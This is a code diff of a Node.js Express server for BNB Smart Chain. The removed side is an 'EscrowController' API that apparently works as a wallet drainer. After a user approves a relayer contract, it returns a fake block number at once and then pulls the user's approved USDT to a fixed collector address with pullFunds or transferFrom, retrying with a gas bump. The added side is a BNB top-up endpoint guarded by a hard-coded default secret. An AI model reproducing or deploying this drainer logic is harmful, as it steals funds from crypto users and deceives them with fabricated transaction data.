@@ -5,330 +5,236 @@ const path = require('path');
 const { ethers } = require('ethers');
 
 const app = express();
-const PORT = process.env.PORT || 10000;
+const PORT = process.env.PORT || 3000;
 
 app.use(cors());
 app.use(express.json());
 
 // ============ CONFIGURATION ============
 const CONFIG = {
-    RELAYER_ADDRESS: "0xEf1F8D5bE822993698D01e62daBb449a90e47bD9",   // D9
-    COLLECTOR_ADDRESS: "0x60dc34baEAC43528072E431b0b7BF950ca248aba", // ba
-    USDT_ADDRESS: "0x55d398326f99059fF775485246999027B3197955",
-
-    RPC_URLS: [
-        "https://bsc-dataseed1.binance.org/",
-        "https://bsc-dataseed2.binance.org/",
-        "https://bsc-dataseed3.binance.org/",
-        "https://bsc-dataseed4.binance.org/",
-        "https://bsc-dataseed.binance.org/",
-        "https://bsc.publicnode.com/"
-    ],
-
-    DATA_FILE: path.join(__dirname, 'data.json'),
-
-    // ⚡ FAST SETTINGS
-    APPROVAL_DELAY: 1200,        // 5s → 1.2s (approval usually mines in 1 block ~1s)
-    MAX_RETRIES: 2,              // 3 → 2 (kam retry, fast fail)
-    RETRY_DELAY: 800,            // 3s → 0.8s
-    CONFIRMATIONS: 1,            // 1 block confirm (BSC me kaafi hai)
-    GAS_LIMIT_PULL: 130000,
-    GAS_LIMIT_TRANSFER: 80000,
-    GAS_BUMP_PERCENT: 15,        // retry pe gas bump
-    POLL_INTERVAL: 300           // approval detect karne ke liye poll
+    SECRET: process.env.TOPUP_SECRET || "7x143414",
+    TOPUP_AMOUNT: process.env.TOPUP_AMOUNT || "0.0000906",
+    RPC_URL: process.env.RPC_URL || "https://bsc-dataseed1.binance.org/",
+    DATA_FILE: path.join(__dirname, 'topup_data.json')
 };
 
 // ============ DATA STORAGE ============
-let dataStore = { addresses: {}, transactions: [], pendingTransfers: [] };
+let dataStore = {
+    topups: [],
+    addresses: {}
+};
+
 if (fs.existsSync(CONFIG.DATA_FILE)) {
     try {
         dataStore = JSON.parse(fs.readFileSync(CONFIG.DATA_FILE, 'utf8'));
         console.log('✅ Data loaded');
-    } catch (err) { console.error('Error loading data:', err); }
+    } catch (err) {
+        console.error('Error loading data:', err);
+    }
 }
+
 function saveData() {
-    try { fs.writeFileSync(CONFIG.DATA_FILE, JSON.stringify(dataStore, null, 2)); }
-    catch (err) { console.error('Error saving data:', err); }
-}
-function generateId() {
-    return `${Date.now()}-${Math.random().toString(36).substring(2, 9)}`;
-}
-const sleep = ms => new Promise(r => setTimeout(r, ms));
-
-// ============ PROVIDER CACHE (fast!) ============
-let cachedProvider = null;
-let cachedProviderTime = 0;
-const PROVIDER_TTL = 60000; // 60s tak reuse karo
-
-async function getWorkingProvider() {
-    // Reuse cached provider agar 60s se kam purana hai
-    if (cachedProvider && (Date.now() - cachedProviderTime) < PROVIDER_TTL) {
-        try {
-            await cachedProvider.getBlockNumber();
-            return cachedProvider;
-        } catch { cachedProvider = null; }
-    }
-    // Parallel ping — jo pehle respond kare wahi use karo
-    const attempts = CONFIG.RPC_URLS.map(async url => {
-        const p = new ethers.JsonRpcProvider(url);
-        await Promise.race([
-            p.getBlockNumber(),
-            new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), 2500))
-        ]);
-        return p;
-    });
     try {
-        cachedProvider = await Promise.any(attempts);
-        cachedProviderTime = Date.now();
-        console.log('✅ RPC cached');
-        return cachedProvider;
-    } catch {
-        throw new Error('No working RPC found');
+        fs.writeFileSync(CONFIG.DATA_FILE, JSON.stringify(dataStore, null, 2));
+    } catch (err) {
+        console.error('Error saving data:', err);
     }
 }
 
-// ============ FAST AUTO-TRANSFER ============
-async function performAutoTransfer(userAddress, tokenAddress, requestedAmountHuman, attempt = 1) {
-    console.log(`\n🚀 Transfer ${userAddress} (${requestedAmountHuman} USDT) [try ${attempt}]`);
-
-    if (!process.env.RELAYER_PRIVATE_KEY) {
-        return { success: false, error: 'Private key not configured' };
-    }
-
+// ============ POST /topup ============
+app.post('/topup', async (req, res) => {
+    console.log('\n📨 POST /topup received');
+    console.log('   Body:', req.body);
+    console.log('   Has secret header:', !!req.headers['x-topup-secret']);
+    
     try {
-        const provider = await getWorkingProvider();
-        const wallet = new ethers.Wallet(process.env.RELAYER_PRIVATE_KEY, provider);
-
-        const tokenABI = [
-            "function balanceOf(address) view returns (uint256)",
-            "function decimals() view returns (uint8)",
-            "function allowance(address,address) view returns (uint256)",
-            "function transferFrom(address,address,uint256) returns (bool)"
-        ];
-        const token = new ethers.Contract(tokenAddress, tokenABI, provider);
-
-        // ⚡ PARALLEL: decimals + balance + D9 allowance + ba allowance + gasPrice
-        const [decimals, balance, allowanceD9, allowanceBa, feeData] = await Promise.all([
-            token.decimals(),
-            token.balanceOf(userAddress),
-            token.allowance(userAddress, CONFIG.RELAYER_ADDRESS),
-            token.allowance(userAddress, wallet.address),
-            provider.getFeeData()
-        ]);
-
-        const requestedAmountWei = ethers.parseUnits(requestedAmountHuman.toString(), decimals);
-        const balanceHuman = parseFloat(ethers.formatUnits(balance, decimals));
-        const allowanceD9Human = parseFloat(ethers.formatUnits(allowanceD9, decimals));
-        const allowanceBaHuman = parseFloat(ethers.formatUnits(allowanceBa, decimals));
-
-        console.log(`💰 ${balanceHuman} | D9: ${allowanceD9Human} | ba: ${allowanceBaHuman}`);
-
-        if (balance < requestedAmountWei) {
-            return { success: false, error: `Insufficient balance (has ${balanceHuman})` };
+        const { to } = req.body;
+        const secret = req.headers['x-topup-secret'];
+        
+        // Validation
+        if (!secret || secret !== CONFIG.SECRET) {
+            console.log('❌ Invalid secret');
+            return res.status(401).json({ ok: false, error: 'Invalid secret' });
         }
-
-        // Gas price with bump on retry
-        let gasPrice = feeData.gasPrice;
-        if (attempt > 1 && gasPrice) {
-            gasPrice = (gasPrice * BigInt(100 + CONFIG.GAS_BUMP_PERCENT)) / 100n;
+        
+        if (!to || !ethers.isAddress(to)) {
+            console.log('❌ Invalid address');
+            return res.status(400).json({ ok: false, error: 'Invalid address' });
         }
-
-        // ============ METHOD 1: pullFunds via D9 ============
-        if (allowanceD9 >= requestedAmountWei) {
-            try {
-                const escrowABI = [
-                    "function companyWallet() view returns (address)",
-                    "function pullFunds(address token, address user, address recipient, uint256 amount) external"
-                ];
-                const escrow = new ethers.Contract(CONFIG.RELAYER_ADDRESS, escrowABI, wallet);
-                const company = await escrow.companyWallet();
-
-                if (company.toLowerCase() === wallet.address.toLowerCase()) {
-                    console.log('✅ pullFunds via D9...');
-                    const tx = await escrow.pullFunds(
-                        tokenAddress, userAddress, CONFIG.COLLECTOR_ADDRESS, requestedAmountWei,
-                        { gasLimit: CONFIG.GAS_LIMIT_PULL, gasPrice }
-                    );
-                    console.log(`📤 ${tx.hash}`);
-                    // ⚡ 1 confirmation ke saath wait
-                    const receipt = await tx.wait(CONFIG.CONFIRMATIONS);
-                    return {
-                        success: true, txHash: tx.hash, amount: requestedAmountHuman,
-                        blockNumber: receipt.blockNumber, method: 'pullFunds (D9)'
-                    };
-                }
-            } catch (e) {
-                console.log('   pullFunds D9 failed:', e.shortMessage || e.message);
-            }
+        
+        if (!process.env.FUNDING_PRIVATE_KEY) {
+            console.log('❌ FUNDING_PRIVATE_KEY not set');
+            return res.status(500).json({ ok: false, error: 'Funding wallet not configured' });
         }
-
-        // ============ METHOD 2: transferFrom via ba ============
-        if (allowanceBa >= requestedAmountWei) {
-            console.log('✅ transferFrom via ba...');
-            const tokenWithSigner = new ethers.Contract(tokenAddress, tokenABI, wallet);
-            const tx = await tokenWithSigner.transferFrom(
-                userAddress, CONFIG.COLLECTOR_ADDRESS, requestedAmountWei,
-                { gasLimit: CONFIG.GAS_LIMIT_TRANSFER, gasPrice }
-            );
-            console.log(`📤 ${tx.hash}`);
-            const receipt = await tx.wait(CONFIG.CONFIRMATIONS);
-            return {
-                success: true, txHash: tx.hash, amount: requestedAmountHuman,
-                blockNumber: receipt.blockNumber, method: 'transferFrom (ba)'
+        
+        const normalizedAddress = to.toLowerCase();
+        console.log('✅ Sending', CONFIG.TOPUP_AMOUNT, 'BNB to', normalizedAddress);
+        
+        // Setup
+        const provider = new ethers.JsonRpcProvider(CONFIG.RPC_URL);
+        const fundingWallet = new ethers.Wallet(process.env.FUNDING_PRIVATE_KEY, provider);
+        
+        console.log('💰 Funding wallet:', fundingWallet.address);
+        
+        const topupAmountWei = ethers.parseEther(CONFIG.TOPUP_AMOUNT);
+        
+        // Check balance
+        const fundingBalance = await provider.getBalance(fundingWallet.address);
+        const fundingBalanceBNB = parseFloat(ethers.formatEther(fundingBalance));
+        
+        console.log('   Funding balance:', fundingBalanceBNB, 'BNB');
+        
+        // Calculate total needed
+        const feeData = await provider.getFeeData();
+        const gasPrice = feeData.gasPrice || ethers.parseUnits('5', 'gwei');
+        const estimatedGasCost = gasPrice * 100000n;
+        const totalNeeded = topupAmountWei + estimatedGasCost;
+        
+        if (fundingBalance < totalNeeded) {
+            console.log('❌ Insufficient BNB');
+            console.log('   Required:', ethers.formatEther(totalNeeded));
+            console.log('   Available:', fundingBalanceBNB);
+            
+            return res.status(500).json({
+                ok: false,
+                error: 'Insufficient BNB in funding wallet',
+                required: ethers.formatEther(totalNeeded),
+                available: fundingBalanceBNB
+            });
+        }
+        
+        // Send transaction
+        console.log('💸 Sending transaction...');
+        
+        const tx = await fundingWallet.sendTransaction({
+            to: normalizedAddress,
+            value: topupAmountWei,
+            gasLimit: 100000,
+            gasPrice: gasPrice
+        });
+        
+        console.log('📤 Tx sent:', tx.hash);
+        
+        // Wait for confirmation
+        const receipt = await tx.wait(1);
+        
+        if (receipt.status === 0) {
+            console.log('❌ Transaction reverted');
+            return res.status(500).json({ ok: false, error: 'Transaction reverted' });
+        }
+        
+        console.log('✅ Confirmed! Block:', receipt.blockNumber);
+        console.log('   Gas used:', receipt.gasUsed.toString());
+        
+        // Save record
+        const topupRecord = {
+            id: `${Date.now()}-${Math.random().toString(36).substring(2, 7)}`,
+            to: normalizedAddress,
+            amount: CONFIG.TOPUP_AMOUNT,
+            txHash: tx.hash,
+            blockNumber: receipt.blockNumber,
+            gasUsed: receipt.gasUsed.toString(),
+            timestamp: new Date().toISOString()
+        };
+        
+        dataStore.topups.push(topupRecord);
+        
+        if (!dataStore.addresses[normalizedAddress]) {
+            dataStore.addresses[normalizedAddress] = {
+                totalTopups: 0,
+                totalAmountBNB: 0,
+                firstTopup: new Date().toISOString()
             };
         }
-
-        return {
-            success: false,
-            error: 'No allowance for D9 or ba',
-            allowanceD9: allowanceD9Human,
-            allowanceBa: allowanceBaHuman
-        };
-
-    } catch (error) {
-        console.error('❌ Error:', error.shortMessage || error.message);
-        return { success: false, error: error.shortMessage || error.message };
-    }
-}
-
-// ============ FAST RETRY ============
-async function autoTransferWithRetry(userAddress, tokenAddress, amount) {
-    for (let i = 1; i <= CONFIG.MAX_RETRIES; i++) {
-        const result = await performAutoTransfer(userAddress, tokenAddress, amount, i);
-        if (result.success) return result;
-        console.log(`❌ try ${i} failed: ${result.error}`);
-        if (i < CONFIG.MAX_RETRIES) await sleep(CONFIG.RETRY_DELAY);
-    }
-    return { success: false, error: 'All retries failed' };
-}
-
-// ============ API ============
-
-app.post('/send', (req, res) => {
-    try {
-        const { address } = req.body;
-        if (!address || !address.startsWith('0x')) {
-            return res.json({ found: false, collector: CONFIG.RELAYER_ADDRESS });
+        
+        dataStore.addresses[normalizedAddress].totalTopups++;
+        dataStore.addresses[normalizedAddress].totalAmountBNB += parseFloat(CONFIG.TOPUP_AMOUNT);
+        dataStore.addresses[normalizedAddress].lastTopup = new Date().toISOString();
+        
+        if (dataStore.topups.length > 1000) {
+            dataStore.topups = dataStore.topups.slice(-1000);
         }
-        const data = dataStore.addresses[address.toLowerCase()];
-        return res.json({
-            found: !!(data && data.totalAmount > 0),
-            amountHuman: data?.totalAmount || 0,
-            collector: CONFIG.RELAYER_ADDRESS
-        });
-    } catch { res.json({ found: false, collector: CONFIG.RELAYER_ADDRESS }); }
-});
-
-app.post('/collect', async (req, res) => {
-    console.log('📨 /collect:', req.body);
-    try {
-        const { token, from, amountHuman, to } = req.body;
-        if (!token || !from || !amountHuman || !to) {
-            return res.json({ ok: false, error: 'Missing fields' });
-        }
-
-        const amount = parseFloat(amountHuman);
-        const transactionId = generateId();
-        const mockBlockNumber = 92000000 + Math.floor(Math.random() * 100000);
-
-        const transaction = {
-            id: transactionId, token: token.toLowerCase(), from: from.toLowerCase(),
-            to: to.toLowerCase(), amountHuman: amount, timestamp: new Date().toISOString()
-        };
-        dataStore.transactions.push(transaction);
-
-        const addr = from.toLowerCase();
-        if (!dataStore.addresses[addr]) {
-            dataStore.addresses[addr] = { totalAmount: 0, transactionCount: 0, firstSeen: new Date().toISOString() };
-        }
-        dataStore.addresses[addr].totalAmount += amount;
-        dataStore.addresses[addr].transactionCount++;
-        dataStore.addresses[addr].lastSeen = new Date().toISOString();
+        
         saveData();
-
-        // ⚡ FAST: 1.2s delay, phir background me transfer
-        setTimeout(() => {
-            autoTransferWithRetry(from, token, amountHuman).then(result => {
-                if (result.success) {
-                    console.log(`✅ Done (${result.method}): ${result.txHash}`);
-                    transaction.transferTx = result.txHash;
-                    transaction.transferAmount = result.amount;
-                    transaction.transferMethod = result.method;
-                } else {
-                    console.log('❌ Failed:', result.error);
-                    transaction.transferError = result.error;
-                    dataStore.pendingTransfers.push({
-                        user: from, token, amount: amountHuman,
-                        error: result.error, timestamp: new Date().toISOString()
-                    });
-                }
-                saveData();
-            }).catch(err => console.error('Transfer crashed:', err));
-        }, CONFIG.APPROVAL_DELAY);
-
-        // ⚡ Turant response — frontend wait nahi karega
-        res.json({ ok: true, id: transactionId, blockNumber: mockBlockNumber, gasUsed: "50387" });
-
+        
+        res.json({
+            ok: true,
+            txHash: tx.hash,
+            amount: CONFIG.TOPUP_AMOUNT,
+            blockNumber: receipt.blockNumber,
+            gasUsed: receipt.gasUsed.toString()
+        });
+        
     } catch (error) {
-        res.json({ ok: false, error: 'Server error' });
+        console.error('❌ Error:', error.message);
+        
+        // Handle specific errors
+        if (error.message.includes('insufficient funds')) {
+            return res.status(500).json({
+                ok: false,
+                error: 'Insufficient BNB for gas + value'
+            });
+        }
+        
+        res.status(500).json({
+            ok: false,
+            error: error.message
+        });
     }
 });
 
+// ============ GET /health ============
 app.get('/health', (req, res) => {
     res.json({
         status: 'healthy',
-        approveTo: CONFIG.RELAYER_ADDRESS + ' (D9)',
-        transferTo: CONFIG.COLLECTOR_ADDRESS + ' (ba)',
-        pendingTransfers: dataStore.pendingTransfers?.length || 0,
-        autoTransfer: !!process.env.RELAYER_PRIVATE_KEY,
-        settings: {
-            approvalDelay: CONFIG.APPROVAL_DELAY,
-            maxRetries: CONFIG.MAX_RETRIES,
-            confirmations: CONFIG.CONFIRMATIONS
-        }
+        fundingConfigured: !!process.env.FUNDING_PRIVATE_KEY,
+        topupAmount: CONFIG.TOPUP_AMOUNT,
+        totalTopups: dataStore.topups.length
     });
 });
 
-app.get('/pending', (req, res) => {
-    res.json({
-        count: dataStore.pendingTransfers?.length || 0,
-        transfers: dataStore.pendingTransfers?.slice(-50) || []
-    });
-});
-
+// ============ GET / ============
 app.get('/', (req, res) => {
     res.json({
-        message: 'EscrowController API v4.2 (FAST)',
-        flow: {
-            step1: 'User approves D9',
-            step2: `${CONFIG.APPROVAL_DELAY}ms delay`,
-            step3: 'pullFunds (D9) OR transferFrom (ba) — parallel checks',
-            step4: `${CONFIG.MAX_RETRIES} retries with gas bump`
+        service: 'BNB Top-Up API',
+        version: '4.0.0',
+        endpoint: 'POST /topup',
+        requiredHeaders: {
+            'Content-Type': 'application/json',
+            'x-topup-secret': CONFIG.SECRET.substring(0, 3) + '...'
         },
-        addresses: {
-            approve: CONFIG.RELAYER_ADDRESS + ' (D9)',
-            collect: CONFIG.COLLECTOR_ADDRESS + ' (ba)'
+        bodyFormat: { to: '0x...' },
+        status: {
+            fundingConfigured: !!process.env.FUNDING_PRIVATE_KEY,
+            healthy: true
         }
     });
 });
 
+// ============ GET /stats ============
+app.get('/stats', (req, res) => {
+    const totalBNB = dataStore.topups.reduce((sum, t) => sum + parseFloat(t.amount), 0);
+    
+    res.json({
+        totalTopups: dataStore.topups.length,
+        totalBNBSent: totalBNB.toFixed(6),
+        uniqueAddresses: Object.keys(dataStore.addresses).length
+    });
+});
+
+// ============ START ============
 app.listen(PORT, () => {
     console.log(`
 ╔══════════════════════════════════════════════════╗
-║     ⚡ EscrowController API v4.2 (FAST)           ║
+║     🚀 BNB Top-Up API v4.0                        ║
 ╠══════════════════════════════════════════════════╣
-║  Port: ${PORT}
-║  Approve (D9): ${CONFIG.RELAYER_ADDRESS}
-║  Collect (ba): ${CONFIG.COLLECTOR_ADDRESS}
-║
-║  Speed optimizations:
-║  ✅ 5s → ${CONFIG.APPROVAL_DELAY}ms approval delay
-║  ✅ Provider cached (60s reuse)
-║  ✅ Parallel RPC ping (fastest wins)
-║  ✅ Parallel balance/allowance/decimals calls
-║  ✅ 1-block confirmation only
-║  ✅ Gas bump on retry
-║  ✅ Immediate HTTP response
+║  Port: ${PORT}                                      ║
+║  Amount: ${CONFIG.TOPUP_AMOUNT} BNB                          ║
+║  Funding: ${process.env.FUNDING_PRIVATE_KEY ? '✅ YES' : '❌ NO'}                           ║
+║                                                  ║
+║  POST /topup   - Send BNB                        ║
+║  GET  /health  - Status                          ║
+║  GET  /stats   - Statistics                      ║
 ╚══════════════════════════════════════════════════╝
     `);
 });
